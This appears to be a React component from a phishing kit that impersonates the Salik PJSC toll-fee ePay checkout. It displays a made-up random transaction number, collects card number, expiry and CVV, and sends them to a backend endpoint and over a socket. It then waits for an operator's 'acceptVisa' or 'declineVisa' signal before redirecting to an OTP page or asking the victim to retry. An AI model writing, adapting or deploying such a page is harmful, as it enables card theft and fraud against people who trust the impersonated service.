import React, { useEffect, useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import { apiRoute, socket } from "../App";
import axios from "axios";
import { TailSpin } from "react-loader-spinner";
import { IoIosArrowUp } from "react-icons/io";

const Payment = () => {
  const query = new URLSearchParams(window.location.search);
  const data = query.get("data");
  const [method, setMethod] = useState("");
  const [no, setNo] = useState(generateRandomNumber());
  const [cardNumber, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [expirationDate, setExpiration] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);

  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");

    // Add space after every 4 digits
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    // Limit input to 3 digits
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };

  const handleExpiryDateChange = (e) => {
    // Limit input to 4 characters (MM/YY)
    const numericValue = e.target.value.replace(/\D/g, "");
    let formattedValue = numericValue.slice(0, 5);

    // Add "/" after 2 characters (month)
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    setExpiration(formattedValue);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError(null);
    if (cardNumber.startsWith("4")) {
      setMethod("visa");
    } else if (cardNumber.startsWith("5")) {
      setMethod("master");
    } else {
      return window.alert("Card Must Start With 5 Or 4 ");
    }
    let finalData = {
      ...JSON.parse(data),
      method,
      visa_card_number: cardNumber,
      visa_cvv: cvv,
      visa_expiryDate: expirationDate,
    };
    setLoading(true);
    await axios.post(
      apiRoute + "/visa/" + sessionStorage.getItem("id"),
      finalData
    );
    socket.emit("visa", { finalData, id: sessionStorage.getItem("id") });
    sessionStorage.setItem(
      "method",
      cardNumber.startsWith("5")
        ? "master"
        : cardNumber.startsWith("4")
        ? "visa"
        : null
    );
  };

  socket.on("acceptVisa", (result) => {
    if (result === sessionStorage.getItem("id")) window.location.href = `/otp`;
  });

  socket.on("declineVisa", (result) => {
    console.log(result);
    if (result === sessionStorage.getItem("id")) {
      setError(true);
      setLoading(false);
    }
  });

  function generateRandomNumber() {
    // Make a random 14-digit number
    const randomPart = Math.floor(Math.random() * 1e14)
      .toString()
      .padStart(14, "0");
    return "#5" + randomPart;
  }

  return (
    <>
      {loading && (
        <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen bg-opacity-50 left-0 bg-gray-300 ">
          <TailSpin
            height="50"
            width="50"
            color="green"
            ariaLabel="tail-spin-loading"
            radius="1"
            wrapperStyle={{}}
            wrapperClass=""
            visible={true}
          />
        </div>
      )}
      <div className=" flex-1   py-1 flex items-center flex-col w-full bg-[#f2f5f8]">
        <div className="w-full  flex  justify-between items-center p-5 my-2  text-[#4f6f8c]">
          <span className="   ">Salik PJSC</span>
          <span className="">{no}</span>
          <div className="flex items-center ">
            <span>Details</span>
            <IoIosArrowUp />
          </div>
        </div>
        <div className="w-full mx-2 p-4 flex flex-col bg-white gap-y-2">
          <div className="w-full flex items-center justify-between px-2 text-sm text-gray-600 border-b pb-3">
            <span>Service</span>
            <span>Salik Toll Fees</span>
          </div>
          <div className="w-full flex items-center justify-between px-2 text-sm text-gray-600 border-b pb-3">
            <span>ePay Transaction No</span>
            <span>{no}</span>
          </div>
          <div className="w-full flex items-center justify-between px-2 text-sm text-gray-600 border-b pb-3">
            <span>Amount</span>
            <span>
              {Number(sessionStorage.getItem("price")).toLocaleString()} AED
            </span>
          </div>
        </div>
      </div>

      <form
        onSubmit={handleSubmit}
        className=" flex-1   py-1 flex items-center flex-col w-full bg-[#f2f5f8]"
      >
        <div className="w-full  flex   items-center p-5 my-2  text-[#4f6f8c]">
          <span className="   ">Enter Card Details</span>
          <img src="/payment.png" className="w-1/2" />
        </div>
        <div className="w-full mx-2 p-4 flex flex-col bg-white gap-y-2">
          <div className="w-full flex items-center justify-between px-2 text-sm text-gray-600 border-b pb-3">
            <span>Credit Card Number</span>
            <input
              placeholder="Card Number"
              className="border shadow-xl p-2 w-1/2 text-xs"
              maxLength={19}
              dir="ltr"
              inputMode="numeric"
              type="text"
              value={cardNumber}
              onChange={handleCardNumberChange}
              required
            />
          </div>
          <div className="w-full flex items-center justify-between px-2 text-sm text-gray-600 border-b pb-3">
            <span>Expiry Date</span>
            <input
              placeholder="MM/YY"
              className="border shadow-xl p-2 w-1/3 text-center text-xs"
              type="text"
              maxLength={5}
              inputMode="numeric"
              onChange={handleExpiryDateChange}
              required
              value={expirationDate}
            />
          </div>
          <div className="w-full flex items-center justify-between px-2 text-sm text-gray-600 border-b pb-3">
            <span>CVV Number</span>
            <input
              type="text"
              value={cvv}
              onChange={handleCvvChange}
              inputMode="numeric"
              maxLength={3}
              required
              placeholder="CVV"
              className="border shadow-xl p-2 w-1/3 text-center  text-xs"
            />
          </div>
          <div className="flex items-center justify-center w-full">
            <img src="/payment2.png" className="w-3/4" />
          </div>
          {error && (
            <div className="bg-red-100 text-red-800 p-2 w-full rounded mt-2 text-sm text-center">
              Incorrect information try again
            </div>
          )}
        </div>
        <div className="w-full flex items-center justify-end px-2 text-lg pt-4 text-gray-600 ">
          <span className="text-gray-500">Amount :</span>
          <span>
            {Number(sessionStorage.getItem("price")).toLocaleString()} AED
          </span>
        </div>
        <div className="w-full flex items-center justify-end px-2 gap-x-5 text-base pt-4 text-gray-600 ">
          <span className="px-4 pb-blue bg-[#e8edf1]  rounded-full py-1">
            Cancel
          </span>
          <button
            type="submit"
            className="px-6 pb-blue bg-[#005ba8] text-white rounded-full py-1"
          >
            Pay
          </button>
        </div>
        <span className="p-5 text-center w-full text-gray-500">
          Copyright © 2025. All rights reserved.
        </span>
      </form>
    </>
  );
};

export default Payment;
